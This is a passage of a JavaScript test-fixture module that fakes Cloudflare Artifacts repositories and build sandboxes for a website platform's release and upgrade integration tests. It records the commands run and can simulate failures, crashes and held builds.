import {
  SDK_BUNDLE_BUILD_MANIFEST,
  sdkBundleMissingLine,
  sdkBundleName,
} from "camox/_internal/sdkBundleName";
// Fakes for the release, creation, deletion and upgrade Workflows' Cloudflare Artifacts, sandbox
// and email bindings, the revision sandboxes the agent's builds run in, and the Cloudflare API
// they call, run by the integration tests as an auxiliary Worker (vite.config.ts), which bundles
// it with the fake Git server its repos' remotes are served by (fake-git-server.ts) and the fake
// Cloudflare API (fake-cloudflare-api.ts). Everything
// shares one isolate, so the fakes and the tests that drive them through `ReleaseFakes` share
// this module's state, keyed by repo name.
import { DurableObject, RpcTarget, WorkerEntrypoint } from "cloudflare:workers";

import { tar, untarGzip } from "../src/lib/tar";
import {
  cloudflareCalls,
  deployUserWorker,
  failCloudflareCalls,
  failDeletionsOf,
  holdCloudflareCalls,
  letGoCloudflareCalls,
  order,
  serveCloudflareApi,
  userWorker,
  userWorkersOf,
} from "./fake-cloudflare-api";
import {
  FAKE_GIT_HOST,
  commitFiles,
  deleteGitRepo,
  forkGitRepo,
  gitBranches,
  gitFiles,
  gitLog,
  hasGitRepo,
  failPushes,
  holdPushes,
  letGoPushes,
  losePushResponse,
  pushesWaiting,
  readGitCommit,
  readGitFile,
  readGitLink,
  serveGit,
  takePushEvents,
} from "./fake-git-server";

/** @type {Map<string, Map<string, Record<string, string>>>} repo name → commit → path → content */
const repos = new Map();
/** @type {Map<string, string>} repo name → the commit its `main` points to */
const mains = new Map();
/** @type {Map<string, { command: string, env: Record<string, string>, order: number }[]>} repo name → commands */
const commandsRun = new Map();
/** @type {Map<string, { pattern: string, times: number }[]>} repo name → commands that fail */
const failures = new Map();
/** @type {Map<string, string>} repo name → a command that waits until the test lets it go */
const held = new Map();
/** @type {{ from: unknown, to: string, subject: string, text: string, html: string }[]} */
const emailsSent = [];
/** @type {string[]} texts that make a send throw when an email contains one */
const failingEmails = [];
/** @type {Map<string, number>} repo name → `get` calls left that find its fork still running */
const forksRunning = new Map();
/** @type {Set<string>} repos whose next fork lands but throws, as if its response were lost */
const lostForkResponses = new Set();
/** @type {Set<string>} repos every fork of fails */
const failingForks = new Set();
/**
 * An error the way the Artifacts binding's errors reach a Worker in production: `code` is in
 * neither the error nor its message (`ArtifactsError: repo already exists: <name>`), so it
 * only names the case here.
 * @param {ArtifactsErrorCode} _code
 * @param {string} message
 */
function artifactsError(_code, message) {
  return Object.assign(new Error(message), { name: "ArtifactsError" });
}

// The checkout script fetches `.../git/<namespace>/<repo>.git`, which tells the sandbox its repo.
const REMOTE = /\/git\/[^/]+\/([^/'"]+)\.git/;
// How @cloudflare/ci wraps a runner's command to capture its output.
const WRAPPED = /^\(([\s\S]*)\) > \S+ 2> \S+$/;

class FakeRepo extends RpcTarget {
  /** @param {string} name */
  constructor(name) {
    super();
    this.name = name;
  }

  /** Like Cloudflare Artifacts, the plaintext is the secret followed by `?expires=<unix seconds>`. */
  async createToken(scope = "write", ttl = 86_400) {
    const expires = Math.floor(Date.now() / 1000) + ttl;
    return {
      id: crypto.randomUUID(),
      plaintext: `artifacts-${scope}-token?expires=${expires}`,
      scope,
      expiresAt: new Date(expires * 1000).toISOString(),
    };
  }

  async revokeToken() {
    return true;
  }

  /** @param {string} ref a commit, or `main` */
  commit(ref) {
    return ref === "main" || ref === "refs/heads/main" ? (mains.get(this.name) ?? ref) : ref;
  }

  async info() {
    return {
      id: this.name,
      name: this.name,
      description: null,
      defaultBranch: "main",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      lastPushAt: null,
      source: null,
      readOnly: false,
      remote: `https://${FAKE_GIT_HOST}/git/projects/${this.name}.git`,
    };
  }

  /** @param {{ ref: string, path: string }} args */
  async readFile({ ref, path }) {
    const content =
      repos.get(this.name)?.get(this.commit(ref))?.[path] ??
      (await readGitFile(this.name, ref, path));
    return content === undefined || content === null ? null : new Blob([content]);
  }

  /**
   * Forks this repo. Like Cloudflare Artifacts, the fork runs in the background: the next `get`
   * of the new repo finds it still running.
   * @param {string} name
   */
  async fork(name) {
    if (failingForks.has(name)) throw artifactsError("INTERNAL_ERROR", "Fork failed");
    if (hasGitRepo(name) || repos.has(name)) {
      throw artifactsError("ALREADY_EXISTS", `repo already exists: ${name}`);
    }
    forkGitRepo(this.name, name);
    forksRunning.set(name, 1);
    if (lostForkResponses.delete(name)) throw new Error("Network connection lost.");
    return {
      id: name,
      name,
      description: null,
      defaultBranch: "main",
      remote: `https://${FAKE_GIT_HOST}/git/projects/${name}.git`,
      token: `artifacts-write-token`,
    };
  }

  /**
   * The history of `main`: a pushed repo's head as its only commit, or a Git repo's commits.
   * @param {{ ref?: string, limit?: number }} options
   */
  async log({ ref = "main", limit = 50 } = {}) {
    if (repos.has(this.name)) {
      const hash = this.commit(ref);
      return repos.get(this.name)?.has(hash) ? [{ hash, parents: [] }] : [];
    }
    const commits = await gitLog(this.name);
    return commits.slice(0, limit).map(({ oid, message }) => ({ hash: oid, message }));
  }

  /**
   * A commit with its tree: a pushed commit's tree names its files, so pushing the same files
   * again gives the same tree, as Git does.
   * @param {string} hash
   */
  async readCommit(hash) {
    const files = repos.get(this.name)?.get(hash);
    if (files) return { hash, treeHash: await treeOf(files), parents: [] };
    return readGitCommit(this.name, hash);
  }

  // No trees: @cloudflare/ci then skips its cache, which these tests don't cover.
  async readTree() {
    return null;
  }
}

/**
 * A pushed commit's tree: a hash of its files, the same for the same files.
 * @param {Record<string, string>} files
 */
async function treeOf(files) {
  const listing = JSON.stringify(Object.entries(files).sort(([a], [b]) => (a < b ? -1 : 1)));
  const digest = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(listing));
  return [...new Uint8Array(digest)].map((byte) => byte.toString(16).padStart(2, "0")).join("");
}

/** The Cloudflare Artifacts namespace binding. */
export class FakeArtifacts extends WorkerEntrypoint {
  /** @param {string} name */
  async get(name) {
    if (!repos.has(name) && !hasGitRepo(name)) {
      throw artifactsError("NOT_FOUND", `Repository not found: ${name}`);
    }
    const running = forksRunning.get(name) ?? 0;
    if (running > 0) {
      forksRunning.set(name, running - 1);
      throw artifactsError("FORK_IN_PROGRESS", `Repository is still forking: ${name}`);
    }
    return new FakeRepo(name);
  }

  /** @param {string} name */
  async delete(name) {
    return deleteGitRepo(name) || repos.delete(name);
  }
}

/**
 * A sandbox as `@cloudflare/sandbox`'s `getSandbox` drives it over RPC. It checks out nothing
 * and runs nothing: it records each runner's command with its environment, and exits non-zero
 * where a test asked it to.
 */
export class FakeSandbox extends DurableObject {
  /** @type {string | undefined} */
  repo;
  /** Its name, as `getSandbox` gives it. */
  name = "";
  /** @type {Map<string, string>} the files written to it, by path */
  files = new Map();
  /** @type {Map<string, Uint8Array>} the files of `files` that are bytes, such as archives */
  binaries = new Map();
  /** Whether a workspace snapshot was restored into it. */
  restoredBackup = false;
  /** @type {string[]} the commands it ran outside a step, as an SDK Bundle's build runs them */
  commands = [];

  async configure(configuration = {}) {
    if (configuration.sandboxName) this.name = configuration.sandboxName.name;
  }

  async writeFile(path, content) {
    if (typeof content === "string") {
      this.files.set(path, content);
    } else {
      const bytes = new Uint8Array(await new Response(content).arrayBuffer());
      this.binaries.set(path, bytes);
      this.files.set(path, new TextDecoder().decode(bytes));
    }
    return { success: true, path, timestamp: "" };
  }

  /** @param {string} path a file, or a folder holding one */
  async exists(path) {
    const exists = [...this.files.keys()].some(
      (file) => file === path || file.startsWith(`${path}/`),
    );
    return { success: true, path, exists, timestamp: "" };
  }

  /** Whether the website's camox in `folder` builds against an SDK Bundle. */
  #buildsAgainstSdkBundle(folder = WORKSPACE) {
    return [...this.files].some(
      ([path, content]) =>
        path.startsWith(`${folder.replace(/\/$/, "")}/`) &&
        sdkBundleSwitchedOn.some((marker) => content.includes(marker)),
    );
  }

  /**
   * What `camox release` finds in its SDK Bundle cache: each folder's manifest, by its name. A
   * website whose camox builds against an SDK Bundle fails without both of its targets there.
   * @param {string} command
   * @param {Record<string, string>} env
   */
  async #releaseSdkBundleCache(command, env) {
    const cache = env.CAMOX_INTERNAL_SDK_BUNDLE_CACHE;
    /** @type {Record<string, string>} */
    const cached = {};
    for (const [path, content] of this.files) {
      const name = cache && new RegExp(`^${cache}/([^/]+)/sdk-bundle\\.json$`).exec(path)?.[1];
      if (name) cached[name] = content;
    }
    if (!this.#buildsAgainstSdkBundle()) return { cached, missing: false };
    // An Upgrade's build first copies back the files its update saved (`buildCommand`).
    const folder = command.includes(".camox-upgrade") ? `${WORKSPACE}/.camox-upgrade` : WORKSPACE;
    const lockfile = this.files.get(`${folder}/pnpm-lock.yaml`) ?? "";
    const names = await Promise.all(
      ["browser", "workerd"].map((target) =>
        sdkBundleName({ lockfile, target, settings: HOSTED_SETTINGS }),
      ),
    );
    return { cached, missing: names.some((name) => cached[name] === undefined) };
  }

  async readFile(path = "", options = {}) {
    const content = this.files.get(path);
    if (content === undefined) return { content: "" };
    return {
      success: true,
      path,
      content:
        options.encoding === "base64"
          ? toBase64(this.binaries.get(path) ?? new TextEncoder().encode(content))
          : content,
      encoding: options.encoding === "base64" ? "base64" : "utf-8",
      timestamp: "",
    };
  }

  /**
   * @param {string} command
   * @param {unknown} _session
   * @param {{ env?: Record<string, string>, cwd?: string }} options
   */
  async execWithSessionToken(command, _session, options = {}) {
    this.repo ??= REMOTE.exec(command)?.[1];
    const result = (exitCode, stdout = "") => ({
      success: exitCode === 0,
      exitCode,
      stdout,
      stderr: "",
      command,
    });
    // Not a FUSE device, the way a local container answers `test -c /dev/fuse`.
    if (command.startsWith("test -c /dev/fuse")) return result(1);
    const checkout = CHECKOUT_COMMAND.exec(command);
    if (checkout && this.repo) {
      // The commit's files, over what a restored snapshot left.
      const files =
        repos.get(this.repo)?.get(checkout[1]) ?? (await gitFiles(this.repo, checkout[1]));
      for (const [path, content] of Object.entries(files ?? {})) {
        if (typeof content === "string") this.files.set(`${WORKSPACE}/${path}`, content);
      }
    }
    if (this.repo) return result(0);
    this.commands.push(command);
    // pnpm 11 holds back packages published less than a day ago, as every camox release an
    // Upgrade installs is, unless the workspace exempts camox's own packages.
    if (/^pnpm install --frozen-lockfile\b/.test(command)) {
      const workspace = this.files.get(
        `${(options.cwd ?? "").replace(/\/$/, "")}/pnpm-workspace.yaml`,
      );
      const exempt = /minimumReleaseAgeExclude:\s*\n\s+- camox\s*\n\s+- "@camox\/\*"/;
      if (!workspace || !exempt.test(workspace)) {
        return {
          ...result(1),
          stderr:
            "[ERR_PNPM_MINIMUM_RELEASE_AGE_VIOLATION] camox was published within the minimumReleaseAge cutoff",
        };
      }
    }
    if (SDK_BUNDLE_BUILD_COMMAND.test(command))
      return result(0, await this.#buildSdkBundle(options));
    // Whether the camox installed where it runs builds against an SDK Bundle, as it answers.
    if (SDK_BUNDLE_SWITCH_PROBE.test(command)) {
      const switchedOn = this.#buildsAgainstSdkBundle(options.cwd);
      return result(0, switchedOn ? "sdk-bundle\n" : "whole-app\n");
    }
    const removed = /^rm -rf (\S+)$/.exec(command);
    if (removed) {
      for (const path of this.files.keys()) {
        if (path === removed[1] || path.startsWith(`${removed[1]}/`)) this.files.delete(path);
      }
      return result(0);
    }
    const unpack = SDK_BUNDLE_UNPACK_COMMAND.exec(command);
    if (unpack) {
      const archived = this.binaries.get(unpack[1]);
      if (archived === undefined) return result(2);
      if ([...this.files.keys()].some((path) => path.startsWith(`${unpack[3]}/`))) return result(1);
      const decoder = new TextDecoder();
      for (const [path, content] of await unpackedSdkBundle(archived)) {
        this.files.set(`${unpack[3]}/${path}`, decoder.decode(content));
      }
      this.files.delete(unpack[1]);
      this.binaries.delete(unpack[1]);
      return result(0);
    }
    const archive = SDK_BUNDLE_ARCHIVE_COMMAND.exec(command);
    if (archive) {
      const [, file, target] = archive;
      const build = sdkBundleBuilds.findLast(({ sandbox }) => sandbox === this.name);
      if (!build?.names) return result(2);
      const manifest = `SDK Bundle ${build.names[target]}, built in ${this.name}`;
      this.files.set(file, manifest);
      this.binaries.set(file, await fakeSdkBundleArchive(manifest));
    }
    return result(0);
  }

  /**
   * Builds the SDK Bundle of the website installed in `cwd`, as the website's camox would: named
   * from its lockfile and the settings it's given. Prints the builder's report.
   * @param {{ env?: Record<string, string>, cwd?: string }} options
   */
  async #buildSdkBundle({ cwd = "", env = {} }) {
    const folder = `${cwd.replace(/\/$/, "")}/`;
    const written = Object.fromEntries(
      [...this.files]
        .filter(([path]) => path.startsWith(folder))
        .map(([path, content]) => [path.slice(folder.length), content]),
    );
    const build = {
      order: order(),
      sandbox: this.name,
      written,
      commands: [...this.commands],
      restoredBackup: this.restoredBackup,
      names: null,
    };
    sdkBundleBuilds.push(build);
    const lockfile = written["pnpm-lock.yaml"] ?? "";
    const held = () =>
      heldSdkBundleMarkers.some((marker) => lockfile.includes(marker)) &&
      !letGoSdkBundleSandboxes.has(this.name);
    // Polled: a promise resolved from the request letting go wouldn't wake this one.
    while (held()) await scheduler.wait(10);
    const settings = JSON.parse(env.CAMOX_SDK_BUNDLE_SETTINGS ?? "{}");
    const name = (target) => sdkBundleName({ lockfile, target, settings });
    build.names = forgedSdkBundleNames.find(({ marker }) => lockfile.includes(marker))?.names ?? {
      browser: await name("browser"),
      workerd: await name("workerd"),
    };
    return `vite v8.0.0 building for production...\ncamox-sdk-bundle: ${JSON.stringify(build.names)}\n`;
  }

  /**
   * @param {string} wrapped
   * @param {{ env?: Record<string, string> }} options
   */
  async startProcess(wrapped, options) {
    const command = WRAPPED.exec(wrapped)?.[1] ?? wrapped;
    const repo = this.repo ?? "";
    const run = commandsRun.get(repo) ?? [];
    const sdkBundle = /\bcamox release\b/.test(command)
      ? await this.#releaseSdkBundleCache(command, options.env ?? {})
      : null;
    run.push({
      command,
      env: { ...options.env },
      order: order(),
      ...(sdkBundle ? { sdkBundleCache: sdkBundle.cached } : {}),
    });
    commandsRun.set(repo, run);

    const failure = failures.get(repo)?.find(({ pattern, times }) => {
      return times > 0 && command.includes(pattern);
    });
    if (failure) failure.times -= 1;
    const exitCode = failure || sdkBundle?.missing ? 1 : 0;
    if (exitCode === 0 && command.includes("npm pkg set")) this.#update(repo, command);
    // A release's deploy replaces the project's Worker, named after its Project ID.
    if (exitCode === 0 && /\bwrangler deploy\b/.test(command)) {
      deployUserWorker(repo, `release of ${repo}`);
    }
    const waits = () => {
      const pattern = held.get(repo);
      return pattern !== undefined && command.includes(pattern);
    };
    return {
      id: crypto.randomUUID(),
      waitForExit: async () => {
        // Polls, as a promise can't be settled from the test's request.
        while (waits()) await scheduler.wait(20);
        // An Upgrade's push to a Git repo lands on it, as its commands would make it.
        if (exitCode === 0 && command.includes("HEAD:refs/heads/main") && hasGitRepo(repo)) {
          return { exitCode: await upgradePush(repo, command, run) };
        }
        return { exitCode };
      },
    };
  }

  /**
   * What an Upgrade's update step leaves, as its command would (`updateCommand`): the Camox
   * packages set in `package.json`, the lockfile the install resolves, and both saved in
   * `.camox-upgrade/`.
   * @param {string} repo
   * @param {string} command
   */
  #update(repo, command) {
    const manifest = upgradedManifest(this.files.get(`${WORKSPACE}/package.json`) ?? "{}", command);
    const lockfile =
      installsResolving.get(repo) ?? this.files.get(`${WORKSPACE}/pnpm-lock.yaml`) ?? "";
    for (const folder of [WORKSPACE, `${WORKSPACE}/.camox-upgrade`]) {
      this.files.set(`${folder}/package.json`, manifest);
      this.files.set(`${folder}/pnpm-lock.yaml`, lockfile);
    }
  }

  async createBackup({ dir }) {
    const id = crypto.randomUUID();
    backups.set(id, new Map(this.files));
    return { id, dir, localBucket: true };
  }

  async restoreBackup({ id }) {
    this.restoredBackup = true;
    this.files = new Map(backups.get(id) ?? []);
    return { success: true };
  }

  async listFiles() {
    return { files: [] };
  }

  async destroy() {
    this.files.clear();
    this.binaries.clear();
  }
}

/**
 * A fake SDK Bundle's archive, as ensuring one stores it: a gzipped tar of a folder whose
 * `sdk-bundle.json` is `manifest`, beside an entry module.
 * @param {string} manifest
 */
async function fakeSdkBundleArchive(manifest) {
  const encoder = new TextEncoder();
  const archive = tar(
    Object.entries({ "sdk-bundle.json": manifest, "entry.mjs": `// ${manifest}\n` }).map(
      ([path, content]) => ({ path: `./${path}`, mode: 0o644, content: encoder.encode(content) }),
    ),
  );
  return new Uint8Array(
    await new Response(
      new Blob([archive]).stream().pipeThrough(new CompressionStream("gzip")),
    ).arrayBuffer(),
  );
}

/**
 * The files of an SDK Bundle's archive, by path from its folder, as `tar -xzf` unpacks them.
 * @param {Uint8Array} archive
 */
function unpackedSdkBundle(archive) {
  return untarGzip(new Blob([archive]).stream());
}

/** Where `@cloudflare/ci` checks a step's commit out. */
const WORKSPACE = "/workspace";
/** `@cloudflare/ci`'s checkout of a step's commit, quoted or not. */
const CHECKOUT_COMMAND = /fetch --depth=1 origin '?([0-9a-f]{40})'?/;
/** @type {Map<string, Map<string, string>>} a step's workspace snapshot, by its id */
const backups = new Map();
/** @type {Map<string, string>} repo name → the lockfile `pnpm install` resolves in its upgrade */
const installsResolving = new Map();

/** Asking the website's camox whether it builds against an SDK Bundle (`domains/sdk-bundles`). */
const SDK_BUNDLE_SWITCH_PROBE = /\bCAMOX_SDK_BUNDLE_PROBE\b/;
/** An SDK Bundle's build: the builder, run from the website's folder (`domains/sdk-bundles`). */
const SDK_BUNDLE_BUILD_COMMAND = /\bCAMOX_SDK_BUNDLE_BUILDER\b/;
/** An archive of one target's folder of a built SDK Bundle. */
const SDK_BUNDLE_ARCHIVE_COMMAND = /-cf (\S+) -C \S*\/(browser|workerd) /;
/**
 * @type {{ sandbox: string, written: Record<string, string>, commands: string[], restoredBackup: boolean, names: Record<string, string> | null }[]}
 * every SDK Bundle's build, in the order they started
 */
const sdkBundleBuilds = [];
/** @type {string[]} SDK Bundle builds wait while their lockfile contains one of these */
const heldSdkBundleMarkers = [];
/**
 * @type {{ marker: string, names: Record<string, string> }[]} SDK Bundle builds whose lockfile
 * contains `marker` report `names`, as a forked camox could
 */
const forgedSdkBundleNames = [];
/** @type {Set<string>} sandboxes whose held SDK Bundle build was let go */
const letGoSdkBundleSandboxes = new Set();

/**
 * What an Upgrade's push step does to a Git repo, as its commands would (the upgrade project
 * Workflow's `pushCommand`): commits the `package.json` that the run's `npm pkg set` made from
 * the commit it built on top of the current `main`, and exits 0. A `main` that already has it
 * pushes nothing. A `main` whose platform files changed since that commit exits 1, as the step's
 * check does. The lockfile is left as it is: the fake installs nothing.
 * @param {string} repo
 * @param {string} command
 * @param {{ command: string }[]} run
 */
async function upgradePush(repo, command, run) {
  const built = /fetch -q --depth=1 origin (\S+) refs\/heads\/main:/.exec(command)?.[1];
  const [main, at] = await Promise.all([
    gitFiles(repo, "main"),
    built ? gitFiles(repo, built) : null,
  ]);
  if (!main || !at) return 1;
  const set = run.findLast((ran) => ran.command.includes("npm pkg set"))?.command ?? "";
  const upgraded = upgradedManifest(at["package.json"] ?? "{}", set);
  if (main["package.json"] === upgraded) return 0;
  const platform = ["package.json", "pnpm-lock.yaml"];
  if (platform.some((path) => main[path] !== at[path])) return 1;
  const message = /git commit -q -m "([^"]+)"/.exec(command)?.[1] ?? "Upgrade";
  await commitFiles(repo, { ...main, "package.json": upgraded }, message);
  return 0;
}

/**
 * A `package.json` as `npm pkg set` leaves it, with the versions the command sets.
 * @param {string} packageJson
 * @param {string} command
 */
function upgradedManifest(packageJson, command) {
  const manifest = JSON.parse(packageJson);
  for (const [, section, name, version] of command.matchAll(
    /(dependencies|devDependencies)\.(\S+?)=(\S+)/g,
  )) {
    manifest[section] = { ...manifest[section], [name]: version };
  }
  return `${JSON.stringify(manifest, null, 2)}\n`;
}

/**
 * The files of a tar archive, by path, as text: regular files only, with PAX `path` records for
 * long names, as the working copy writes them.
 * @param {Uint8Array} tar
 */
function untar(tar) {
  /** @type {Record<string, string>} */
  const files = {};
  const decoder = new TextDecoder();
  const field = (at, length) => decoder.decode(tar.subarray(at, at + length)).replace(/\0.*$/s, "");
  let longPath;
  for (let at = 0; at + 512 <= tar.byteLength;) {
    const name = field(at, 100);
    if (!name) break;
    const size = parseInt(field(at + 124, 12).trim() || "0", 8);
    const type = field(at + 156, 1);
    const prefix = field(at + 345, 155);
    const body = tar.subarray(at + 512, at + 512 + size);
    at += 512 + Math.ceil(size / 512) * 512;
    if (type === "x") {
      longPath = /\d+ path=(.*)\n/.exec(decoder.decode(body))?.[1];
      continue;
    }
    const path = longPath ?? (prefix ? `${prefix}/${name}` : name);
    longPath = undefined;
    if (type === "0" || type === "") files[path] = decoder.decode(body);
  }
  return files;
}

/** @param {Uint8Array} bytes */
const toBase64 = (bytes) => btoa(String.fromCharCode(...bytes));

/** Reads a string, or the whole of a stream, as bytes. */
async function bytesOf(/** @type {string | ReadableStream<Uint8Array>} */ content, encoding) {
  if (typeof content === "string") {
    return encoding === "base64"
      ? Uint8Array.from(atob(content), (char) => char.charCodeAt(0))
      : new TextEncoder().encode(content);
  }
  return new Uint8Array(await new Response(content).arrayBuffer());
}

/** @type {Map<string, { sandbox: string, files: Record<string, string>, archive: number[] | null, build?: string }[]>} sandbox → builds */
const revisionBuilds = new Map();
/** @type {Map<string, { command: string, env: Record<string, string> | undefined }[]>} sandbox → commands */
const revisionCommands = new Map();
/** @type {{ marker: string, log: string }[]} builds of a tree with a file holding `marker` fail with `log` */
const failingBuilds = [];
/** @type {{ marker: string, definitionSet: unknown }[]} builds of a tree with a file holding `marker` have that Definition Set */
const definedBuilds = [];
/** @type {{ marker: string, config: Record<string, unknown> }[]} builds of a tree with a file holding `marker` have that in their `wrangler.json` */
const configuredBuilds = [];
/**
 * @typedef {{ file: string, line: number, column: number, code: string, message: string }} FakeTypeError
 * @type {{ marker: string, errors: FakeTypeError[] }[]} type checks of a tree with a file holding `marker` report `errors`
 */
const failingTypeChecks = [];
/** @type {{ marker: string, diagnostics: unknown[] }[]} lints of a tree with a file holding `marker` find `diagnostics` */
const lintedTrees = [];
/**
 * @type {{ marker: string, times: number }[]} calls left that fail, as a crashed container's do,
 * of a sandbox building a tree with a file holding `marker`: test files share the fakes, so a
 * crash reaches only the build its test scripted it for
 */
const sandboxCrashes = [];
/** @type {{ marker: string, times: number }[]} type checks left that crash, as tsrs crashing does, of a tree with a file holding `marker` */
const typeCheckCrashes = [];
/** @type {{ revision: string, archiveKey: string, project: string, draft: string }[]} revisions dispatch prewarmed, oldest first */
const prewarmed = [];
/** @type {Map<string, number>} project → how many of its next prewarms fail, as an unreachable dispatch's would */
const prewarmFailures = new Map();
/** @type {Set<string>} the revision sandboxes destroyed */
const destroyedSandboxes = new Set();
/** @type {Map<string, string>} sandbox → how long it stays up idle */
const sandboxSleepAfter = new Map();
/** @type {Map<string, string>} sandbox → the transport its `getSandbox` configured */
const sandboxTransports = new Map();
/** @type {Map<string, { running: number, most: number }>} sandbox → its builds running now, and the most that ran at once */
const buildsAtOnce = new Map();
/**
 * Where the image of a revision sandbox records the lockfile it installed the Template from, as
 * the release sandbox's Dockerfile writes it.
 */
/** Where a revision sandbox builds the website's files. */
const REVISION_WORKSPACE = "/opt/camox/website";
const IMAGE_INSTALLED_LOCKFILE = `${REVISION_WORKSPACE}/node_modules/.camox-installed-lockfile`;
/** @type {string | null} the digest a new revision sandbox's image says it installed, if a test gave it one */
let imageInstalledLockfile = null;
/** @type {string[]} builds of a tree with a file holding one of these build against an SDK Bundle, as with #674's switch on */
const sdkBundleSwitchedOn = [];
/**
 * The settings a hosted website's `camox()` compiles into its SDK Bundle: its defaults, as the
 * platform-owned `vite.config.ts` sets none of them.
 */
const HOSTED_SETTINGS = {
  iconIds: [],
  telemetryDisabled: false,
  experimentalFeatures: false,
  apiUrl: "https://api.camox.ai",
};
/** Unpacking a stored SDK Bundle's archive into a build's bundle cache, then naming its folder. */
const SDK_BUNDLE_UNPACK_COMMAND = /\btar -xzf (\S+) -C (\S+) .*\bmv -T \2 (\S+)/;
/** @type {Set<string>} the revision sandboxes whose builds are held, as builds still running */
const heldBuilds = new Set();
/** @type {Set<string>} the revision sandboxes whose type checks are held, as checks still running */
const heldTypeChecks = new Set();

/** The build command the revision sandbox runs, and the command that archives its output. */
const BUILD_COMMAND = /\bvp build\b/;
const ARCHIVE_COMMAND = /^tar .*-cf (\S+) /;
const EXTRACT_COMMAND = /\btar -xf (\S+) /;
const LINT_COMMAND = /\bvp lint\b/;
/**
 * What the Camox plugin throws as Vite+ loads the config for a build, which `vp lint` loads it as
 * too, unless `CAMOX_INTERNAL_RELEASE` says a release runs it: the sandbox has no `camox login`.
 */
const UNAUTHENTICATED =
  "Error: Camox: not authenticated. Run `npx camox login` before building the site.";
const releases = (env) => ["1", "dry-run"].includes(env?.CAMOX_INTERNAL_RELEASE);
/** The type check the revision sandbox runs, with the config naming the files it checks. */
const TYPE_CHECK_COMMAND = /^tsrs -p (\S+)/;

/**
 * Whether `path`, relative to the config's directory, matches one of a tsconfig's `include`
 * patterns: `**` + `/` is any directories, `*` any name.
 * @param {string} path
 * @param {string[]} include
 */
function included(path, include) {
  return include.some((pattern) => {
    const source = pattern
      .replace(/^\.\//, "")
      .split(/(\*\*\/|\*)/)
      .map((part) => {
        if (part === "**/") return "(?:.*/)?";
        if (part === "*") return "[^/]*";
        return part.replace(/[.+?^${}()|[\]\\]/g, "\\$&");
      })
      .join("");
    return new RegExp(`^${source}$`).test(path);
  });
}

/**
 * A type error as tsrs prints it with `--pretty false`, as TypeScript's compiler does: the
 * message's later lines are indented under its first.
 * @param {FakeTypeError} error
 */
const printedTypeError = ({ file, line, column, code, message }) =>
  `${file}(${line},${column}): error ${code}: ${message.split("\n").join("\n  ")}`;

/**
 * A revision's sandbox as `@cloudflare/sandbox`'s `getSandbox` drives it over RPC. Its files are
 * held in memory and it runs nothing: extracting a tree reads the archive it was given, a build
 * passes or fails as a test scripted for that tree, and archiving a passed build writes a fake
 * archive naming the tree, with the Definition Set a test scripted for it (an empty one when none
 * did), which `FakeDispatch` reads. Linting the tree prints, as `vp lint --format json` does, the
 * diagnostics a test scripted for it. Every call can be made to fail, as a crashed container's do.
 */
export class FakeRevisionSandbox extends DurableObject {
  /** @type {string} */
  name = "";
  /** @type {Map<string, Uint8Array>} */
  files = new Map();
  /** @type {Record<string, string>} the tree last extracted into the workspace */
  tree = {};
  /** Whether the last build passed. */
  built = false;
  /** @type {{ browser: string, workerd: string } | null} the SDK Bundle the last build named */
  sdkBundle = null;

  /** Whether the website's camox in the workspace builds against an SDK Bundle. */
  #buildsAgainstSdkBundle() {
    return sdkBundleSwitchedOn.some((marker) =>
      Object.values(this.tree).some((content) => content.includes(marker)),
    );
  }

  /** @param {Uint8Array} [incoming] a file being written, the tree's archive among them */
  #crash(incoming) {
    const decoder = new TextDecoder();
    const held = [...this.files.values(), ...(incoming ? [incoming] : [])].map((bytes) =>
      decoder.decode(bytes),
    );
    const crash = sandboxCrashes.find(
      ({ marker, times }) => times > 0 && held.some((content) => content.includes(marker)),
    );
    if (crash) {
      crash.times -= 1;
      throw new Error("Container crashed while checking for ports");
    }
  }

  /**
   * @param {DurableObjectState} ctx
   * @param {unknown} env
   */
  constructor(ctx, env) {
    super(ctx, env);
    // As the real sandbox does, it keeps its name across restarts: `getSandbox` configures it only
    // once per API isolate, so a sandbox evicted since isn't told its name again.
    ctx.blockConcurrencyWhile(async () => {
      this.name = (await ctx.storage.get("name")) ?? "";
    });
    // A container starts from its image, which may hold an install.
    if (imageInstalledLockfile) {
      this.files.set(IMAGE_INSTALLED_LOCKFILE, new TextEncoder().encode(imageInstalledLockfile));
    }
  }

  async configure(configuration) {
    if (configuration.sandboxName) {
      this.name = configuration.sandboxName.name;
      await this.ctx.storage.put("name", this.name);
    }
    if (configuration.sleepAfter !== undefined) {
      sandboxSleepAfter.set(this.name, configuration.sleepAfter);
    }
    if (configuration.transport !== undefined) {
      sandboxTransports.set(this.name, configuration.transport);
    }
  }

  async writeFile(path, content, options = {}) {
    // As the real sandbox does: only its RPC transport writes a stream.
    if (content instanceof ReadableStream && sandboxTransports.get(this.name) !== "rpc") {
      throw new Error("writeFileStream requires the rpc transport. Set SANDBOX_TRANSPORT=rpc.");
    }
    const bytes = await bytesOf(content, options.encoding);
    this.#crash(bytes);
    this.files.set(path, bytes);
    return { success: true, path, timestamp: new Date().toISOString() };
  }

  async exists(path) {
    this.#crash();
    return { success: true, path, exists: this.files.has(path), timestamp: "" };
  }

  async readFile(path, options = {}) {
    this.#crash();
    // The workspace's files are the tree last extracted into it.
    const extracted = path.startsWith(`${REVISION_WORKSPACE}/`)
      ? this.tree[path.slice(REVISION_WORKSPACE.length + 1)]
      : undefined;
    const bytes =
      this.files.get(path) ??
      (extracted === undefined ? undefined : new TextEncoder().encode(extracted));
    if (!bytes) throw new Error(`File not found: ${path}`);
    const base64 = options.encoding === "base64";
    return {
      success: true,
      path,
      content: base64 ? toBase64(bytes) : new TextDecoder().decode(bytes),
      encoding: base64 ? "base64" : "utf-8",
      timestamp: "",
    };
  }

  /** A command run outside the sandbox's shell session, as `enableDefaultSession: false` runs them. */
  async execWithSessionToken(command, _session, options = {}) {
    return this.exec(command, options);
  }

  /**
   * @param {string} command
   * @param {{ env?: Record<string, string>, cwd?: string }} options
   */
  async exec(command, options = {}) {
    this.#crash();
    const commands = revisionCommands.get(this.name) ?? [];
    commands.push({ command, env: options.env });
    revisionCommands.set(this.name, commands);
    const result = (exitCode, stderr = "", stdout = "") => ({
      success: exitCode === 0,
      exitCode,
      stdout,
      stderr,
      command,
      duration: 0,
      timestamp: "",
    });
    const extract = EXTRACT_COMMAND.exec(command);
    if (extract) {
      const tar = this.files.get(extract[1]);
      if (!tar) return result(2, `tar: ${extract[1]}: Cannot open: No such file or directory`);
      this.tree = untar(tar);
      this.built = false;
      return result(0);
    }
